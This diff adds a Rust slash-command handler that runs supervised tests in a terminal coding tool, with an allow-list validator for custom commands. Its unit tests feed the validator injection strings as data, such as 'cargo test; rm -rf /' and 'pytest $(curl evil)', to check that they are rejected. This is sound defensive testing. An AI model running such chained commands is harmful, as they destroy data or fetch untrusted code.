@@ -1,0 +1,516 @@
+//! /test slash command handler for supervised test execution.
+
+use crate::app::send_tui;
+use crate::app::App;
+use crate::app::TuiCommand;
+use crate::async_cmd::spawn_registered_tui_task;
+use crate::commands::close_command_mode;
+use crate::task_lifecycle::TuiTaskKind;
+use codegg::test_runner::custom::validate_custom_command;
+
+/// Parse the raw arguments after `/test` into a scope string and extra args.
+pub(crate) fn parse_test_slash_args(raw: &str) -> (String, String) {
+    let trimmed = raw.trim();
+    if trimmed.is_empty() {
+        return ("auto".to_string(), String::new());
+    }
+    let mut parts = trimmed.splitn(2, ' ');
+    let subcmd = parts.next().unwrap_or("auto").to_lowercase();
+    let rest = parts.next().unwrap_or("").trim().to_string();
+
+    match subcmd.as_str() {
+        "workspace" | "ws" => ("workspace".to_string(), String::new()),
+        "changed" | "diff" => ("changed".to_string(), String::new()),
+        "package" | "pkg" | "p" => ("package".to_string(), rest),
+        "file" | "f" => ("file".to_string(), rest),
+        "previous" | "prev" | "last" => ("previous_failures".to_string(), String::new()),
+        "custom" | "cmd" => ("custom".to_string(), rest),
+        _ => ("auto".to_string(), trimmed.to_string()),
+    }
+}
+
+/// Build a TestRunRequest from scope and args.
+fn build_test_request(
+    scope: &str,
+    args: &str,
+    workdir: std::path::PathBuf,
+) -> Result<codegg::test_runner::TestRunRequest, String> {
+    use codegg::test_runner::TestScope;
+    use std::path::PathBuf;
+
+    let test_scope = match scope {
+        "auto" => TestScope::Auto,
+        "workspace" => TestScope::Workspace,
+        "changed" => TestScope::Changed,
+        "package" => {
+            if args.trim().is_empty() {
+                return Err("package scope requires a package name".into());
+            }
+            TestScope::Package(args.trim().to_string())
+        }
+        "file" => {
+            if args.trim().is_empty() {
+                return Err("file scope requires a file path".into());
+            }
+            TestScope::File(PathBuf::from(args.trim()))
+        }
+        "previous_failures" => TestScope::PreviousFailures,
+        "custom" => {
+            if args.trim().is_empty() {
+                return Err("custom scope requires 'command' parameter. Example: {\"scope\":\"custom\",\"command\":\"cargo test -p mycrate\"}".into());
+            }
+            let cmd = args.trim();
+            if validate_custom_command(cmd).is_err() {
+                return Err(format!(
+                    "custom command rejected by safety validator: '{cmd}'. \
+                     Allowed argv prefixes: cargo test, cargo clippy, cargo nextest, pytest, \
+                     uv run pytest, go test, zig build test, make test, make check, \
+                     npm test, pnpm test, yarn test, bun test. \
+                     Shell metacharacters, redirection, pipes, command substitution, \
+                     and newlines are not allowed."
+                ));
+            }
+            TestScope::CustomCommand(cmd.to_string())
+        }
+        other => return Err(format!("unknown scope '{other}'")),
+    };
+
+    Ok(codegg::test_runner::TestRunRequest {
+        scope: test_scope,
+        workdir,
+        execution_cwd: None,
+        timeout_secs: None,
+        stall_timeout_secs: None,
+        max_report_bytes: None,
+        session_id: None,
+        parent_run_id: None,
+        cancellation: None,
+    })
+}
+
+/// Start a supervised test run from the /test slash command.
+pub(crate) fn start_test_run(app: &mut App, scope: String, args: String) {
+    let tx = app.tui_cmd_tx.clone();
+    let (session_id, workdir) = match app.project_execution_context() {
+        Ok(context) => (context.session_id, context.workspace_root),
+        Err(error) => {
+            app.messages_state.toasts.error(&error);
+            return;
+        }
+    };
+    let Some(core_client) = app.core_client.clone() else {
+        app.messages_state
+            .toasts
+            .error("Core client unavailable; tests require the daemon scheduler");
+        return;
+    };
+    let request_id = app.dialog_state.test_run_request.begin();
+    // M007-D: the daemon owns the effect.
+    let command_scope = crate::command_route::scope_for(app);
+
+    spawn_registered_tui_task(
+        tx,
+        &mut app.task_registry,
+        TuiTaskKind::Command,
+        "test_run",
+        async move {
+            let request = match build_test_request(&scope, &args, workdir) {
+                Ok(r) => r,
+                Err(e) => {
+                    return Some(TuiCommand::TestRunFinished {
+                        request_id,
+                        report: None,
+                        summary: None,
+                        error: Some(e),
+                    });
+                }
+            };
+            let mut request = request;
+            request.session_id = session_id;
+            let workspace = match core_client
+                .request(codegg::core::new_request(
+                    format!("test-workspace-{}", uuid::Uuid::new_v4()),
+                    codegg::protocol::core::CoreRequest::WorkspaceRegister {
+                        root: request.workdir.to_string_lossy().into_owned(),
+                    },
+                ))
+                .await
+            {
+                Ok(response) => response,
+                Err(e) => {
+                    return Some(TuiCommand::TestRunFinished {
+                        request_id,
+                        report: None,
+                        summary: None,
+                        error: Some(format!("workspace registration failed: {e}")),
+                    });
+                }
+            };
+            let workspace_id = match workspace {
+                codegg::protocol::core::CoreResponse::WorkspaceSnapshot { workspace } => {
+                    workspace.workspace_id
+                }
+                codegg::protocol::core::CoreResponse::Error { message, .. } => {
+                    return Some(TuiCommand::TestRunFinished {
+                        request_id,
+                        report: None,
+                        summary: None,
+                        error: Some(message),
+                    });
+                }
+                other => {
+                    return Some(TuiCommand::TestRunFinished {
+                        request_id,
+                        report: None,
+                        summary: None,
+                        error: Some(format!("unexpected workspace response: {other:?}")),
+                    });
+                }
+            };
+            let resolved = match codegg::test_runner::resolve_test_command(&request) {
+                Ok(resolved) => resolved,
+                Err(e) => {
+                    return Some(TuiCommand::TestRunFinished {
+                        request_id,
+                        report: None,
+                        summary: None,
+                        error: Some(format!("test command resolution failed: {e}")),
+                    });
+                }
+            };
+            let payload = match serde_json::to_value(codegg_core::jobs::JobPayload::Test {
+                command: resolved.argv.join(" "),
+                argv: resolved.argv,
+                cwd: Some(resolved.cwd.to_string_lossy().into_owned()),
+                scope: Some(resolved.scope_label),
+                parent_run_id: None,
+                sandbox_profile: None,
+                network_intent: codegg_core::approval::NetworkIntent::LegacyUnrestricted,
+            }) {
+                Ok(payload) => payload,
+                Err(e) => {
+                    return Some(TuiCommand::TestRunFinished {
+                        request_id,
+                        report: None,
+                        summary: None,
+                        error: Some(format!("test payload encoding failed: {e}")),
+                    });
+                }
+            };
+            let spec = codegg::protocol::dto::JobSubmitDto {
+                submission_key: Some(format!("tui-test-{request_id}")),
+                workspace_id,
+                session_id: request.session_id.clone(),
+                turn_id: None,
+                kind: "test".into(),
+                priority: "interactive".into(),
+                source: serde_json::json!({"kind": "interactive"}),
+                payload,
+                timeout_ms: request.timeout_secs.map(|s| (s as i64) * 1000),
+                retry_max_attempts: 1,
+                retryable_failures: Vec::new(),
+                idempotency: "safe_repeat".into(),
+                not_before_ms: None,
+                deadline_ms: None,
+                schedule_id: None,
+                depends_on: Vec::new(),
+                labels: std::collections::HashMap::new(),
+                target: None,
+                remote_resources: None,
+            };
+            let submitted = match core_client
+                .request(codegg::core::new_request(
+                    format!("test-submit-{}", uuid::Uuid::new_v4()),
+                    codegg::protocol::core::CoreRequest::JobSubmit { spec },
+                ))
+                .await
+            {
+                Ok(response) => response,
+                Err(e) => {
+                    return Some(TuiCommand::TestRunFinished {
+                        request_id,
+                        report: None,
+                        summary: None,
+                        error: Some(format!("test submission failed: {e}")),
+                    });
+                }
+            };
+            let job_id = match submitted {
+                codegg::protocol::core::CoreResponse::JobSubmitted { job_id } => job_id,
+                codegg::protocol::core::CoreResponse::Error { message, .. } => {
+                    return Some(TuiCommand::TestRunFinished {
+                        request_id,
+                        report: None,
+                        summary: None,
+                        error: Some(message),
+                    });
+                }
+                other => {
+                    return Some(TuiCommand::TestRunFinished {
+                        request_id,
+                        report: None,
+                        summary: None,
+                        error: Some(format!("unexpected test submission response: {other:?}")),
+                    });
+                }
+            };
+            // M007-D: the daemon owns the effect. The argument carries the
+            // job id and, when the frontend asked for a bound, that bound
+            // in milliseconds.
+            let timeout_ms = request
+                .timeout_secs
+                .map(|s| s.saturating_add(5).saturating_mul(1000));
+            let argument = match timeout_ms {
+                Some(ms) => format!("{job_id} {ms}"),
+                None => job_id.clone(),
+            };
+            match crate::command_route::send_command(
+                &core_client,
+                command_scope,
+                "test",
+                "",
+                &argument,
+            )
+            .await
+            {
+                Ok(codegg::protocol::core::CoreResponse::JobWaited { summary, .. }) => {
+                    Some(TuiCommand::TestRunFinished {
+                        request_id,
+                        report: None,
+                        summary: Some(summary),
+                        error: None,
+                    })
+                }
+                Ok(codegg::protocol::core::CoreResponse::Error { message, .. }) => {
+                    Some(TuiCommand::TestRunFinished {
+                        request_id,
+                        report: None,
+                        summary: None,
+                        error: Some(message),
+                    })
+                }
+                Ok(other) => Some(TuiCommand::TestRunFinished {
+                    request_id,
+                    report: None,
+                    summary: None,
+                    error: Some(format!("unexpected test wait response: {other:?}")),
+                }),
+                Err(e) => Some(TuiCommand::TestRunFinished {
+                    request_id,
+                    report: None,
+                    summary: None,
+                    error: Some(format!("test wait failed: {e}")),
+                }),
+            }
+        },
+    );
+}
+
+/// Handle the TestRunFinished completion: display the report in the UI.
+pub(crate) fn apply_test_run_finished(
+    app: &mut App,
+    request_id: u64,
+    report: Option<Box<codegg::test_runner::TestReport>>,
+    summary: Option<String>,
+    error: Option<String>,
+) {
+    if !app.dialog_state.test_run_request.finish(request_id) {
+        return;
+    }
+    if let Some(err) = error {
+        app.messages_state.toasts.error(&err);
+        return;
+    }
+    if let Some(output) = summary {
+        let lines: Vec<String> = output.lines().map(|s| s.to_string()).collect();
+        if lines.len() <= 3 {
+            app.messages_state.toasts.info(&output);
+        } else {
+            app.open_info_dialog(
+                crate::components::dialogs::info::InfoType::DoctorReport,
+                lines,
+            );
+        }
+    } else if let Some(report) = report {
+        let output = codegg::test_runner::format_test_report(&report);
+        let lines: Vec<String> = output.lines().map(|s| s.to_string()).collect();
+        if lines.len() <= 3 {
+            app.messages_state.toasts.info(&output);
+        } else {
+            app.open_info_dialog(
+                crate::components::dialogs::info::InfoType::DoctorReport,
+                lines,
+            );
+        }
+    }
+}
+
+pub(crate) fn dispatch_tests(app: &mut App, argument: &str) {
+    let subcmd = argument;
+    app.ui_state.command_mode = false;
+    app.handle_tests_command(subcmd);
+}
+
+pub(crate) fn dispatch_test(app: &mut App, argument: &str) {
+    let raw_args = argument.to_string();
+    let (scope, args) = crate::commands::test::parse_test_slash_args(&raw_args);
+    close_command_mode(app);
+    if let Some(ref tx) = app.tui_cmd_tx {
+        let _ = send_tui(tx, TuiCommand::TestRun { scope, args });
+    }
+    app.messages_state
+        .toasts
+        .info("Starting supervised test run...");
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn slash_test_no_args_maps_to_auto() {
+        let (scope, args) = parse_test_slash_args("");
+        assert_eq!(scope, "auto");
+        assert_eq!(args, "");
+    }
+
+    #[test]
+    fn slash_test_workspace_maps_to_workspace() {
+        let (scope, args) = parse_test_slash_args("workspace");
+        assert_eq!(scope, "workspace");
+        assert_eq!(args, "");
+    }
+
+    #[test]
+    fn slash_test_changed_maps_to_changed() {
+        let (scope, args) = parse_test_slash_args("changed");
+        assert_eq!(scope, "changed");
+        assert_eq!(args, "");
+    }
+
+    #[test]
+    fn slash_test_package_requires_name() {
+        let (scope, args) = parse_test_slash_args("package codegg-core");
+        assert_eq!(scope, "package");
+        assert_eq!(args, "codegg-core");
+    }
+
+    #[test]
+    fn slash_test_file_requires_path() {
+        let (scope, args) = parse_test_slash_args("file tests/foo.rs");
+        assert_eq!(scope, "file");
+        assert_eq!(args, "tests/foo.rs");
+    }
+
+    #[test]
+    fn slash_test_previous_maps_to_previous_failures() {
+        let (scope, args) = parse_test_slash_args("previous");
+        assert_eq!(scope, "previous_failures");
+        assert_eq!(args, "");
+    }
+
+    #[test]
+    fn slash_test_custom_missing_command_matches_tool_error() {
+        let err = build_test_request("custom", "", "/tmp".into()).unwrap_err();
+        assert!(
+            err.contains("custom scope requires 'command'"),
+            "TUI custom error must use the tool literal, got: {err}"
+        );
+        assert!(
+            err.contains("cargo test -p mycrate"),
+            "TUI custom error must carry the documented example, got: {err}"
+        );
+    }
+
+    #[test]
+    fn slash_test_custom_uses_same_validation_as_tool() {
+        let (scope, args) = parse_test_slash_args("custom cargo test --lib");
+        assert_eq!(scope, "custom");
+        assert_eq!(args, "cargo test --lib");
+    }
+
+    #[test]
+    fn slash_test_aliases() {
+        let (scope, _) = parse_test_slash_args("ws");
+        assert_eq!(scope, "workspace");
+        let (scope, _) = parse_test_slash_args("diff");
+        assert_eq!(scope, "changed");
+        let (scope, _) = parse_test_slash_args("prev");
+        assert_eq!(scope, "previous_failures");
+        let (scope, _) = parse_test_slash_args("pkg my-crate");
+        assert_eq!(scope, "package");
+        let (scope, _) = parse_test_slash_args("f src/main.rs");
+        assert_eq!(scope, "file");
+    }
+
+    #[test]
+    fn slash_test_command_is_registered() {
+        let registry = crate::command::CommandRegistry::new();
+        let cmd = registry.find_by_name_or_alias("/test");
+        assert!(cmd.is_some(), "/test command not found in registry");
+        let cmd = cmd.unwrap();
+        assert_eq!(cmd.name, "/test");
+    }
+
+    #[test]
+    fn tui_test_custom_rejects_semicolon_suffix() {
+        // Bypass regression: TUI /test custom must use the strict validator.
+        assert!(build_test_request("custom", "cargo test; rm -rf /", "/tmp".into()).is_err());
+    }
+
+    #[test]
+    fn tui_test_custom_rejects_newline_suffix() {
+        assert!(build_test_request("custom", "cargo test\nrm -rf /", "/tmp".into()).is_err());
+    }
+
+    #[test]
+    fn tui_test_custom_rejects_pipe_suffix() {
+        assert!(build_test_request("custom", "pytest | tee /tmp/out", "/tmp".into()).is_err());
+    }
+
+    #[test]
+    fn tui_test_custom_rejects_command_substitution() {
+        assert!(build_test_request("custom", "pytest $(curl evil)", "/tmp".into()).is_err());
+        assert!(build_test_request("custom", "cargo test `curl evil`", "/tmp".into()).is_err());
+    }
+
+    #[test]
+    fn tui_test_custom_rejects_prefix_collision() {
+        assert!(build_test_request("custom", "pytestevil", "/tmp".into()).is_err());
+        assert!(build_test_request("custom", "cargo testify", "/tmp".into()).is_err());
+    }
+
+    #[test]
+    fn tui_test_custom_accepts_normal_pytest_args() {
+        let req =
+            build_test_request("custom", "pytest -q tests/test_foo.py", "/tmp".into()).unwrap();
+        assert!(matches!(
+            req.scope,
+            codegg::test_runner::TestScope::CustomCommand(_)
+        ));
+    }
+
+    #[test]
+    fn tui_test_custom_accepts_normal_cargo_test_args() {
+        let req =
+            build_test_request("custom", "cargo test --lib -p codegg-core", "/tmp".into()).unwrap();
+        assert!(matches!(
+            req.scope,
+            codegg::test_runner::TestScope::CustomCommand(_)
+        ));
+    }
+
+    #[test]
+    fn tui_test_custom_accepts_cargo_clippy_args() {
+        let req = build_test_request(
+            "custom",
+            "cargo clippy --offline --locked --workspace --all-targets -- -D warnings",
+            "/tmp".into(),
+        )
+        .unwrap();
+        assert!(matches!(
+            req.scope,
+            codegg::test_runner::TestScope::CustomCommand(_)
+        ));
+    }
+}
